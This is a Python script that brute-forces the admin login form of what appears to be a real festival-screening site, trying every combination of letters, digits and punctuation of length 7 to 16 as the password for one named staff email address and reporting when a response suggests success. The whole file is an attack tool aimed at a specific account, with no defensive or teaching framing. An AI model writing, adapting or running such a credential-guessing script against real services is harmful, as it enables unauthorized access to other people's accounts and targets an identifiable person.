import requests
import itertools
import string
import time

# Define the target URL for login submission
url = "https://pro.festivalscope.com/admin/check"  # Form action URL

# Define the character set (letters, digits, and special characters)
characters = string.ascii_letters + string.digits + string.punctuation

# Define the email to use for login attempts
email = "alessandro@festivalscope.com"  # Email to test

# Set the desired length of the password (e.g., 7 to 16 characters)
min_length = 7
max_length = 16

# Function to attempt login with a given password
def attempt_login(email, password):
    # Create a dictionary with the login data
    data = {
        "_username": email,  # Field name for the username
        "_password": password  # Field name for the password
    }

    try:
        # Send the POST request to the login page
        response = requests.post(url, data=data)

        # Print response status and text for debugging
        print(f"Status Code: {response.status_code}")
        print(f"Response Text: {response.text[:500]}")  # Print first 500 chars of response text

        # Check the response to see if login was successful
        # Adjust this based on actual response from the server
        if "Welcome" in response.text or "Dashboard" in response.text:
            print(f"[+] Success! Password found: {password}")
            return True
        elif "Login failed" in response.text or "Incorrect password" in response.text:
            print(f"[-] Failed login with password: {password}")
            return False
        else:
            print(f"[?] Unexpected response with password: {password}")
            return False
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

# Loop through each length of password
for length in range(min_length, max_length + 1):
    # Generate all possible combinations of the given length
    for password_tuple in itertools.product(characters, repeat=length):
        # Convert tuple to string
        password = ''.join(password_tuple)
        
        # Attempt to login with the generated password
        if attempt_login(email, password):
            break

        # Optional: Delay between requests to avoid overloading the server
        time.sleep(0.5)  # Adjust delay as needed

    else:
        # Continue to the next length if not successful
        continue
    
    # Break the outer loop if successful
    break
